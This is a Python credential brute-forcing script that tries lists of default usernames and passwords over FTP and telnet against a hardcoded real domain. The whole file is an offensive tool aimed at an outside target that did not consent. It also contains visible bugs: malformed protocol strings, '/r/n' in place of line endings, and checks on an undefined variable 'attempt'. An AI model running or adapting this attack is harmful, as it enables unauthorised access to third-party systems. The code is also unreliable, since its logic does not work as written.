#!/usr/bin/python

import socket
import sys
import re
import ftplib
from ftplib import *


def connect_ftp(ip, username, passwd):
    try:
        server = ftplib.FTP()
        server.connect(ip, 21)
        server.login(username, passwd)
        # You don't have to print this, because this command itself prints dir contents
        server.dir()
        print("Connected")

    except:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print("Initializing ftp login system...")
        s.connect((ip, 21))
        data1 = s.recv(2048)
        print("data1: {}".format(data1))
        s.send('USER'+username+'/r/n')
        data2 = s.recv(2048)
        print("data2: {}".format(data2))
        s.send('PASS' + passwd+ '/r/n')
        s.send('QUIT /r/n')
        data3 = s.recv(2048)
        print("data3: {}".format(data3))
        s.close()
        return data

def connect_telnet(ip, username, passwd):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print("Initializing... telnet login system")
    s.connect((ip, 23))
    data = s.recv(2048)
    s.send(str(username))
    data = s.recv(2048)
    s.send(passwd)
    s.send('QUIT /r/n')
    data = s.recv(2048)
    s.close()
    return data

# print("Enter the IP/ Domain name to start: ", end='')
# ip = input()
ip = "tamilyogi.com"
usernames = ["admin", "user", "root", "administrator", "poweruser", "Admin", "User", "Root", "Administrator", "Poweruser", "ADMIN", "USER", "ROOT", "ADMINISTRATOR", "POWERUSER"]
passwords = ["123", "ftp", "root", "admin", "test", "backup", "password", "password123", "Adminadmin", "12345", "adminadmin", "Admin", "Password", "Password123", "", "!@qwasZX", "!2qwasZX", "qwertyuiop", "QWERTYUIOP", "blank", "localhost", "default", "defaultpassword", "Default", "Defaultpassword", "DefaultPassword", "abc123", "Abc123", "abc123.", "Abc123.", "telnet", "port21", "port23", "admin-admin", "Admin-Admin", "ADMIN-ADMIN", "letmein", "tech", "private", "operator", "debug", "adm", "administrator", "security", "monitor", "manager", "masterkey", "key", "access", "none", "system", "asecret", "maintain", "netman", "service", "supervisor", "remote", "P@ssw0rd", "1234QWER", "anonymous"]
print("Attempting to make you log in...")
for username in usernames:
    for password in passwords:
        attempt1 = connect_ftp(ip, username, password)
        if attempt == "230":
            print("Password found: {}".format(password))
        else:
            print("Still Attempting, Please take bunch...")
            attempt2 = connect_telnet(ip, username, password)
            if attempt == "230":
                print("Password found: {}".format(password))
sys.exit(0)

